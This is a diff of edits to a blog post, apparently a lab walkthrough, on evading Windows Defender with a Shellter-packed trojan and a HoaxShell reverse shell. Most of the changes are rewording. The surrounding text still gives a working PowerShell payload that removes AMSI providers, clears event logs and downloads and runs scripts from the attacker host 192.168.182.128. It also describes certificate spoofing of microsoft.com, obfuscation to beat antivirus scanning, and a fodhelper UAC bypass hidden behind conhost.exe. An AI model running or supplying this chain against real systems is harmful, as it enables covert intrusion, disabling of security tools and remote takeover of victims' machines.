@@ -87,7 +87,7 @@ openssl req -x509 -newkey rsa:2048 -keyout /home/MrTiz/DefenderBypass/certs/key.
 ![](/assets/img/defender-evasion-shellter-hoaxshell/self-signed_certs.png)
 In generating the certificate, the same parameters were used as in the certificate issued for [microsoft.com](https://www.microsoft.com), but it is optional; I only did it because it may increase the stealthiness of the attack.
 
-After that, we can start HoaxShell listening on port 443:
+After that, I started HoaxShell listening on port 443:
 ```sh
 hoaxshell -s 192.168.182.128 -c /home/MrTiz/DefenderBypass/certs/cert.pem -k /home/MrTiz/DefenderBypass/certs/key.pem -H 'ms-commit-id' -r
 ```
@@ -119,11 +119,11 @@ Once copied to the Kali machine, I started and configured Shellter:
 ![](/assets/img/defender-evasion-shellter-hoaxshell/shellter1.png)
 ![](/assets/img/defender-evasion-shellter-hoaxshell/shellter2.png)
 
-Paradoxically, enabling **Stealth Mode** makes the Trojan much more detectable by static analysis on VirusTotal, which is why I chosed to disable it, thus going to change the general behavior of the executable, which will then stop doing what it was intended to do.
+Paradoxically, enabling **Stealth Mode** makes the trojan much more detectable by static analysis on VirusTotal, which is why I chosed to disable it, thus going to change the general behavior of the executable, which will then stop doing what it was intended to do.
 
-**WinExec** was chosen as the payload, through which I'm going to execute some of our PowerShell code that will then trigger the actual reverse shell. Embedding a Meterpreter reverse shell or, more generally, a custom one created with `msfvenom` is a risk; generally speaking, it has a higher probability of being detected by both static and especially dynamic analyses.
+**WinExec** was chosen as the payload, through which I'm going to execute some of my PowerShell code that will then trigger the actual reverse shell. Embedding a Meterpreter reverse shell or, more generally, a custom one created with `msfvenom` is a risk; generally speaking, it has a higher probability of being detected by both static and especially dynamic analyses. [Trojan:Win32/Meterpreter](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Meterpreter)
 
-The WinExec payload chosen is the following:
+The **WinExec** payload chosen is the following:
 ```powershell
 cmd /c start /wait /min "" C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -nop -w hidden -noni -c "Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers*\*' -Force -ea SilentlyContinue; Clear-EventLog -LogName 'Windows PowerShell' -ea SilentlyContinue" & cmd /c start /min "" C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -nop -w hidden -noni -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.182.128/4m51.ps1'); Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers*\*' -Force -ea SilentlyContinue; Start-Sleep -Seconds 30; iex(New-Object Net.WebClient).DownloadString('http://192.168.182.128/revs.ps1'); Clear-EventLog -LogName 'Windows PowerShell' -ea SilentlyContinue"
 ```
@@ -152,7 +152,7 @@ Start-Sleep -Seconds 30; iex(New-Object Net.WebClient).DownloadString('http://19
 ```
 Waiting 30 seconds will be useful in the next phases, when I'll escalate the privileges.
 
-Putting PowerShell commands such as the following one can trigger some AV also during static analysis, so, by using [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), I slightly obfuscated the payload in this way:
+Putting PowerShell commands such as the above (`Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers*\*' -Force`) can trigger some AV also during static analysis, so, by using [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), I slightly obfuscated the payload in this way:
 
 ![](/assets/img/defender-evasion-shellter-hoaxshell/Invoke-Obfuscation2.png)
 ```powershell
@@ -179,7 +179,7 @@ On VirusTotal, we found only 3/70 detections, and Windows Defender didn't detect
 ![](/assets/img/defender-evasion-shellter-hoaxshell/virustotal.png)
 
 ## Trojan execution
-Once the Trojan is uploaded to the victim's machine, simply run it:
+Once the trojan is uploaded to the victim's machine, simply run it:
 
 ![](/assets/img/defender-evasion-shellter-hoaxshell/troj-setup_wm.png)
 
@@ -256,7 +256,7 @@ So, since the user is in the `Administrators` group, I can try to bypass UAC. Th
 - [https://github.com/P4R4D0X-HACKS/UAC-Bypass/blob/main/script.ps1](https://github.com/P4R4D0X-HACKS/UAC-Bypass/blob/main/script.ps1)
 - [https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692](https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692)
 
-Unfortunately, these methods are promptly detected by Windows Defender, which blocks the exploitation and kills the PowerShell process: [https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:Win32/UACBypass.A&threatId=-2147190855](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:Win32/UACBypass.A&threatId=-2147190855)
+Unfortunately, these methods are promptly detected by Windows Defender, which blocks the exploitation and kills the PowerShell process: [HackTool:Win32/UACBypass.A](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:Win32/UACBypass.A&threatId=-2147190855)
 
 However, by making some minor corrections to the launched commands and reversing the order in which the registry keys are modified, I can nimbly bypass Defender's monitoring and exploit `fodhelper.exe`.
 To do this, I used a legitimate Microsoft system executable present in all Windows installations, namely `C:\Windows\System32\conhost.exe`. As you can see from [LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Conhost/), I can use `conhost.exe` to execute arbitrary commands. This way, Windows Defender will see that `conhost.exe` is modifying registry keys, not `PowerShell.exe`, dramatically increasing the stealthiness of the change.
